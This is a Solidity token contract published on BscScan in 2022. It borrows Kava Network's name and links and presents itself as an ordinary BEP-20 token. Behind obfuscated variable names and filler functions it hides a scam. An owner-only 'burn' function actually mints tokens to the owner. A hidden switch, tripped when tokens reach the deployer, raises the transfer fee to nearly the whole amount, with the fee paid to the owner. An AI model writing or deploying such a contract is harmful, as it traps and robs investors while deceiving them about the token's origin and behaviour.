/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

/*
KavaNetwork 
@kava_platform
Kava believes in a #Web3 future. #Kava is a decentralized blockchain that is optimized for protocol growth.
https://www.kava.io/
https://t.me/kavalabs
https://twitter.com/kava_platform
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.5.3;
contract KavaN {
address private  hUihJy = address(0);
uint8 public constant decimals = 18;
uint256 private  VTnlnq = 7;
address private  eVeDGj = address(0);
address private  bUzOum = address(0);
uint256 private  GgdMoh = 1000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
address private  TFwuFV = address(0);
uint256 private  NIiRFe = 7;
mapping (address => uint256) public balanceOf;
address public owner;
address private  LiRLWz = address(0);
uint256 private  xdlIgR = 3;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  RVuixI = 8;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "KavaN";
address private  owtnfF = address(0);
uint256 public constant OYSZbB = 99999;
string public  symbol = "KavaN";
uint256 private  pLubvB = 3;
uint256 private  TRRhpO = 8;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  eHirfU = address(0);
address private  YnxnTo = address(0);
address private  usqhNm = address(0);
uint256 public constant totalSupply = 100000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
//
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
//
//
function _get1xdlIgR() private returns (uint256) {
return xdlIgR--;
}
//
//
//
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getp2LubvB() private returns (uint256) {
return pLubvB + 5;
}
//
function _getRV3uixI() private returns (uint256) {
return RVuixI + 0;
}
//
function _getTRR4hpO() private returns (uint256) {
return TRRhpO + 1;
}
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
//
function _getYnxn5To() private returns (address) {
return YnxnTo;
}
//
//
//
function _getTFwuF6V() private returns (address) {
return TFwuFV;
}
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
//
//
constructor () public {
eVeDGj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
//
//
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "QgUnPX");
require(to != address(0), "QgUnPX");
require(amount <= balanceOf[from], "QgUnPX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OYSZbB/GgdMoh ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==eVeDGj){
GgdMoh = OYSZbB+2;
}
emit Transfer(from, to, transferAmount);
}
function _getLiRLWz7() private returns (address) {
return LiRLWz;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _get8usqhNm() private returns (address) {
return usqhNm;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tQgUnPX 0");
require(spender != address(0), "fQgUnPX 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _geto9wtnfF() private returns (address) {
return owtnfF;
}
//
function _getNI10iRFe() private returns (uint256) {
return NIiRFe + 1;
}
//
function _getVTnl11nq() private returns (uint256) {
return VTnlnq + 2;
}
//
function _get1h2UihJy() private returns (address) {
return hUihJy;
}

function _geteHi13rfU() private returns (address) {
return eHirfU;
}
//
//
//
function _getbUzOu14m() private returns (address) {
return bUzOum;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
}

library EnumerableSet {
    struct Set {
        // Storage of set values
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }
    struct Bytes32Set {
        Set _inner;
    }
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }
    struct AddressSet {
        Set _inner;
    }
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
    struct UintSet {
        Set _inner;
    }
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}